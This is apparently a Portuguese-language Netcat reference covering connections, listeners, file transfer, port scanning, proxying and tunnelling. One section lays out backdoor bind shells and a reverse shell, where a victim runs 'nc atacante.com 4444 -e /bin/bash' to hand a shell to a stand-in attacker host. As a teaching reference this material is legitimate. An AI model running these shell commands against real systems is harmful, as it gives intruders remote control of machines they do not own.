## O que é o Netcat?
**Netcat** (nc) é uma ferramenta de rede versátil conhecida como "canivete suíço" das redes. Permite ler e escrever dados através de conexões de rede usando TCP ou UDP.

## Sintaxe Básica
```bash
nc [opções] [host] [porta]
```

## Modos de Operação

### 1. Modo Cliente
```bash
nc exemplo.com 80
```

### 2. Modo Servidor (Listener)
```bash
nc -l -p 1234
```

## Comandos e Opções Principais

### Conexão Básica
```bash
# Conexão TCP simples
nc google.com 80

# Conexão UDP
nc -u dns.server.com 53

# Especificar porta local
nc -s 192.168.1.100 -p 54321 google.com 80
```

### Modo Servidor/Listener
```bash
# Escutar em porta TCP
nc -l -p 8080

# Escutar em porta UDP
nc -u -l -p 5353

# Escutar com endereço específico
nc -l 192.168.1.100 8080

# Manter servidor ativo após desconexão
nc -k -l -p 8080
```

### Transferência de Arquivos

#### Enviar Arquivo (Servidor → Cliente)
**Servidor:**
```bash
nc -l -p 1234 < arquivo.txt
```

**Cliente:**
```bash
nc servidor.com 1234 > arquivo_recebido.txt
```

#### Receber Arquivo (Cliente → Servidor)
**Servidor:**
```bash
nc -l -p 1234 > arquivo_recebido.txt
```

**Cliente:**
```bash
nc servidor.com 1234 < arquivo_enviar.txt
```

### Port Scanning
```bash
# Scan de porta única
nc -zv exemplo.com 80

# Scan de range de portas
nc -zv exemplo.com 20-80

# Scan de portas específicas
nc -zv exemplo.com 22 80 443

# Scan rápido (timeout reduzido)
nc -z -w 1 exemplo.com 1-1000
```

### Banner Grabbing
```bash
echo "" | nc -nv exemplo.com 80
# Ou
printf "GET / HTTP/1.0\r\n\r\n" | nc exemplo.com 80
```

### Proxy e Redirecionamento
```bash
# Como proxy simples
nc -l -p 8080 | nc destino.com 80

# Pipe duplo (bidirecional)
mkfifo pipe
nc -l -p 8080 0<pipe | nc destino.com 80 1>pipe
```

### Backdoors e Shells Remotos

#### Linux/Unix
**Servidor (atacante):**
```bash
nc -l -p 4444 -e /bin/bash
```

**Cliente (vítima conectando ao servidor):**
```bash
nc atacante.com 4444
```

#### Windows
```bash
nc -l -p 4444 -e cmd.exe
```

#### Shell Reverso
**No atacante:**
```bash
nc -l -p 4444
```

**Na vítima:**
```bash
nc atacante.com 4444 -e /bin/bash
# Ou para Windows
nc atacante.com 4444 -e cmd.exe
```

## Opções Detalhadas

### Opções Principais
- `-l` - Modo listen (servidor)
- `-p` - Especificar porta local
- `-u` - Modo UDP (padrão é TCP)
- `-v` - Modo verbose
- `-vv` - Modo mais verbose
- `-z` - Scan mode (não envia dados)
- `-w` - Timeout em segundos
- `-n` - Não resolver DNS (apenas IP)
- `-k` - Manter conexão após cliente desconectar
- `-e` - Executar programa após conexão
- `-s` - Endereço IP local específico
- `-o` - Output em hexdump

### Exemplos com Múltiplas Opções
```bash
# Servidor verbose com timeout
nc -v -l -p 9999 -w 30

# Cliente com IP específico e timeout
nc -s 192.168.1.50 -w 10 exemplo.com 80

# Scan rápido de portas
nc -z -n -w 1 192.168.1.1 1-1000
```

## Exemplos Práticos Avançados

### Chat Simples
**Máquina 1:**
```bash
nc -l -p 9999
```

**Máquina 2:**
```bash
nc máquina1.com 9999
```

### Servidor Web Simples
```bash
while true; do nc -l -p 8080 -c 'echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h1>Hello World</h1></body></html>"'; done
```

### Tunnel SSH
```bash
# No servidor intermediário
nc -l -p 2222 | nc servidor-ssh.com 22

# No cliente
ssh -p 2222 usuario@servidor-intermediario.com
```

### Teste de Conexão com Timeout
```bash
nc -w 5 -zv google.com 80
```

## Segurança e Considerações

### Riscos
- Netcat pode ser usado para backdoors
- Transferências não são criptografadas
- Pode contornar firewalls

### Alternativas Seguras
- **cryptcat** - Netcat com criptografia
- **ncat** - Versão melhorada do Nmap
- **socat** - Mais recursos e segurança

### Boas Práticas
```bash
# Usar versões seguras quando possível
ncat --ssl exemplo.com 443

# Limitar acesso em servidores
nc -l -p 8080 -s 192.168.1.100
```

## Troubleshooting

### Problemas Comuns
```bash
# "Connection refused" - Servidor não está escutando
# "No route to host" - Problema de rede
# "Name or service not known" - DNS não resolve
```

### Debug
```bash
# Modo verbose para diagnóstico
nc -vv exemplo.com 80

# Com timeout para evitar hanging
nc -w 5 exemplo.com 80
```

## Versões Diferentes

### Netcat Tradicional vs OpenBSD
- **netcat-traditional**: Versão original, mais opções
- **netcat-openbsd**: Versão mais segura, menos opções

### Verificar versão:
```bash
nc -h
# Ou
which nc
ls -la /etc/alternatives/nc
```
